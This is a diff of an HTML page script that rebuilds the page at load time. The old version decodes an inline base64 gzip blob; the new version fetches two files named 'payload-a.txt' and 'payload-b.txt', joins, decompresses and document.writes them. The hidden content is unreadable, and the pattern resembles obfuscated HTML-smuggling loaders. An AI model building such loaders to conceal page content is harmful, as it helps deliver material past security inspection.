@@ -8,16 +8,19 @@
 <body>
 <script>
 (async () => {
-  const b64 = "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";
-  const bin = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
-  const ds = new DecompressionStream("gzip");
+  const [a,b] = await Promise.all([
+    fetch('payload-a.txt').then(r => r.text()),
+    fetch('payload-b.txt').then(r => r.text())
+  ]);
+  const bin = Uint8Array.from(atob(a.trim()+b.trim()), c => c.charCodeAt(0));
+  const ds = new DecompressionStream('gzip');
   const stream = new Blob([bin]).stream().pipeThrough(ds);
   const html = await new Response(stream).text();
   document.open();
   document.write(html);
   document.close();
 })().catch(e => {
-  document.body.textContent = "Falha ao carregar: " + e;
+  document.body.textContent = 'Falha ao carregar: ' + e;
 });
 </script>
 </body>
